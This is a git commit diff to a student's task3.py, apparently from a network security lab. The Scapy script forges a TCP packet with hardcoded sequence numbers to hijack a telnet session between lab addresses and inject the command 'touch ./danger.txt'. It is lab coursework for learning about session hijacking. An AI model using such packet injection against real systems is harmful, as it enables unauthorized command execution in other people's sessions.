e49beec86f98becd87bd9e5e1f769a69633e09b4
MoonBasedKas <kassidy.maberry@gmail.com>
2025-04-10 20:38:16 -0600

    Finished content wise.

--- submission/task3.py
+++ submission/task3.py
@@ -2,9 +2,8 @@
 from scapy.all import *
 
 ip = IP(src="10.9.0.6", dst="10.9.0.5")
-tcp = TCP(sport=54286, dport=23, flags="A", seq=1435181587, ack=3653825513)
+tcp = TCP(sport=57328, dport=23, flags="A", seq=1960804135, ack=1174207624)
 data = "touch ./danger.txt\r"
 pkt = ip/tcp/data
 ls(pkt)
 send(pkt, verbose=0)
-sniff()
